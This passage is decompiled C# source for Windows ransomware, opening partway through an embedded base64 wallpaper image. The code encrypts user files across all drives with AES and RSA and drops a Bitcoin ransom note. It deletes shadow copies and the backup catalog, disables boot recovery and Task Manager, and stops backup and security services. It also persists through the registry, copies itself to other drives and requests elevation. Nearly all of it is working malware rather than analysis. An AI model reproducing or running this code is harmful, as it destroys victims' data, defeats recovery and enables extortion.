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";

	public static string appMutexStartup = "1qrx0frdqdur0lllc6ezm";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	private static bool disableTaskManager = true;

	private static bool checkStopBackupServices = true;

	public static string appMutexStartup2 = "19DpJAWr6NCVT2";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static List<string> messages = new List<string>
	{
		"Don't worry, you can return all your files!", "", "All your files like documents, photos, databases and other important are encrypted", "", "What guarantees do we give to you?", "", "You can send 3 of your encrypted files and we decrypt it for free.", "", "You must follow these steps To decrypt your files :   ", "1) Write on our e-mail :test@test.com ( In case of no answer in 24 hours check your spam folder",
		"or write us to this e-mail: test2@test.com)", "", "2) Obtain Bitcoin (You have to pay for decryption in Bitcoins. ", "After payment we will send you the tool that will decrypt all your files.)"
	};

	private static string[] validExtensions = new string[230]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d", ".exe"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		if (forbiddenCountry())
		{
			MessageBox.Show("Forbidden Country");
			return;
		}
		if (RegistryValue())
		{
			new Thread((ThreadStart)delegate
			{
				Run();
			}).Start();
		}
		if (isOver())
		{
			return;
		}
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			registryStartup();
		}
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
			if (disableTaskManager)
			{
				DisableTaskManager();
			}
			if (checkStopBackupServices)
			{
				stopBackupServices();
			}
		}
		lookForDirectories();
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static bool forbiddenCountry()
	{
		string[] array = new string[2] { "az-Latn-AZ", "tr-TR" };
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				string name = InputLanguage.CurrentInputLanguage.Culture.Name;
				if (name == text)
				{
					return true;
				}
			}
			catch
			{
			}
		}
		return false;
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool RegistryValue()
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\" + appMutexRun2);
			object value = registryKey.GetValue(appMutexRun2);
			registryKey.Close();
			if (value.ToString().Length > 0)
			{
				return false;
			}
			return true;
		}
		catch
		{
			return true;
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool checkCrypted = true;
			Parallel.For(0, files.Length, delegate(int i)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (Array.Exists(validExtensions, (string E) => E == extension.ToLower()) && fileName != droppedMessageTextbox)
					{
						FileInfo fileInfo = new FileInfo(files[i]);
						try
						{
							fileInfo.Attributes = FileAttributes.Normal;
						}
						catch
						{
						}
						string text = CreatePassword(40);
						if (fileInfo.Length < 2368709120u)
						{
							if (checkDirContains(files[i]))
							{
								string keyRSA = RSA_Encrypt(text, rsaKey());
								AES_Encrypt(files[i], text, keyRSA);
							}
						}
						else
						{
							AES_Encrypt_Large(files[i], text, fileInfo.Length);
						}
						if (checkCrypted)
						{
							checkCrypted = false;
							string path = location + "/" + droppedMessageTextbox;
							string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
							if (!File.Exists(path) && location != folderPath)
							{
								File.WriteAllLines(path, messages);
							}
						}
					}
				}
				catch (Exception)
				{
				}
			});
			string[] childDirectories = Directory.GetDirectories(location);
			Parallel.For(0, childDirectories.Length, delegate(int i)
			{
				try
				{
					new DirectoryInfo(childDirectories[i]).Attributes &= ~FileAttributes.Normal;
				}
				catch
				{
				}
				encryptDirectory(childDirectories[i]);
			});
		}
		catch (Exception)
		{
		}
	}

	private static bool checkDirContains(string directory)
	{
		directory = directory.ToLower();
		string[] array = new string[16]
		{
			"appdata\\local", "appdata\\locallow", "users\\all users", "\\ProgramData", "boot.ini", "bootfont.bin", "boot.ini", "iconcache.db", "ntuser.dat", "ntuser.dat.log",
			"ntuser.ini", "thumbs.db", "autorun.inf", "bootsect.bak", "bootmgfw.efi", "desktop.ini"
		};
		string[] array2 = array;
		foreach (string value in array2)
		{
			if (directory.Contains(value))
			{
				return false;
			}
		}
		return true;
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>zEOyDHxJHV0xoJBpFqMTdmYgTV6U6DCSf7qSDqaFKrG+g3RPn32bgistR8DuxUHpmPk8xJGLpU0clULUripWiNJ9RccFWsLeivfZeNXzM9KuwD7NtfSJeoJWgfxDu/acSyUwbbUbo/FbUwx0CAgga9jCCUDHWyOUemog6BBcDFAAF7SKQyS4zRa8ibEzkYF13rVxjefaOvrI0pseic0ZXoD9PiMTL3Jvz6Y3nOCNDPoR4+WFhvit2YSRh9dSQJiRpp3pmBEnS35Vm4t7WMZtZ5IvLkDBfIK5gxLLx16eOkpL7AZvSHu3XgPJZNf0g0DsRSSAKeDkqBWhpQ23f4F/wQ==</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	private static void AES_Encrypt(string inputFile, string password, string keyRSA)
	{
		string path = inputFile + "." + RandomStringForExtension(4);
		byte[] array = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		FileStream fileStream = new FileStream(path, FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 128;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 1);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
		fileStream2.CopyTo(cryptoStream);
		fileStream2.Flush();
		fileStream2.Close();
		cryptoStream.Flush();
		cryptoStream.Close();
		fileStream.Close();
		using (FileStream stream = new FileStream(path, FileMode.Append, FileAccess.Write))
		{
			using StreamWriter streamWriter = new StreamWriter(stream);
			streamWriter.Write(keyRSA);
			streamWriter.Flush();
			streamWriter.Close();
		}
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	private static void AES_Encrypt_Large(string inputFile, string password, long lenghtBytes)
	{
		GenerateRandomSalt();
		using FileStream fileStream = new FileStream(inputFile + "." + RandomStringForExtension(4), FileMode.Create, FileAccess.Write, FileShare.None);
		fileStream.SetLength(lenghtBytes);
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		for (int i = 0; i < 10; i++)
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		return array;
	}

	public static string RSA_Encrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			string pathRoot = Path.GetPathRoot(Environment.SystemDirectory);
			if (driveInfo.ToString() == pathRoot)
			{
				string[] array = new string[12]
				{
					"Program Files", "Program Files (x86)", "Windows", "$Recycle.Bin", "MSOCache", "Documents and Settings", "Intel", "PerfLogs", "Windows.old", "AMD",
					"NVIDIA", "ProgramData"
				};
				string[] directories = Directory.GetDirectories(pathRoot);
				for (int j = 0; j < directories.Length; j++)
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(directories[j]);
					string dirName = directoryInfo.Name;
					if (!Array.Exists(array, (string E) => E == dirName))
					{
						encryptDirectory(directories[j]);
					}
				}
			}
			else
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		byte[] bytes = File.ReadAllBytes(location);
		if (!File.Exists(text2))
		{
			File.WriteAllBytes(text2, bytes);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.WriteAllBytes(text2, bytes);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		byte[] bytes = File.ReadAllBytes(location);
		if (!File.Exists(text2))
		{
			File.WriteAllBytes(text2, bytes);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.WriteAllBytes(text2, bytes);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			if (!File.Exists(text))
			{
				File.WriteAllLines(text, messages);
			}
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static bool isOver()
	{
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + processName;
		string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		if (location != text)
		{
			try
			{
				File.Delete(path);
			}
			catch
			{
			}
		}
		if (File.Exists(path) && location == text)
		{
			return true;
		}
		return false;
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("UpdateTask", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != Path.GetPathRoot(Environment.SystemDirectory) && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void DisableTaskManager()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", "1");
			registryKey.Close();
		}
		catch
		{
		}
	}

	private static void stopBackupServices()
	{
		//IL_018a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0190: Expected O, but got Unknown
		string[] array = new string[42]
		{
			"BackupExecAgentBrowser", "BackupExecDiveciMediaService", "BackupExecJobEngine", "BackupExecManagementService", "vss", "sql", "svc$", "memtas", "sophos", "veeam",
			"backup", "GxVss", "GxBlr", "GxFWD", "GxCVD", "GxCIMgr", "DefWatch", "ccEvtMgr", "SavRoam", "RTVscan",
			"QBFCService", "Intuit.QuickBooks.FCS", "YooBackup", "YooIT", "zhudongfangyu", "sophos", "stc_raw_agent", "VSNAPVSS", "QBCFMonitorService", "VeeamTransportSvc",
			"VeeamDeploymentService", "VeeamNFSSvc", "veeam", "PDVFSService", "BackupExecVSSProvider", "BackupExecAgentAccelerator", "BackupExecRPCService", "AcrSch2Svc", "AcronisAgent", "CASAD2DWebSvc",
			"CAARCUpdateSvc", "TeamViewer"
		};
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				ServiceController val = new ServiceController(text);
				val.Stop();
			}
			catch
			{
			}
		}
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
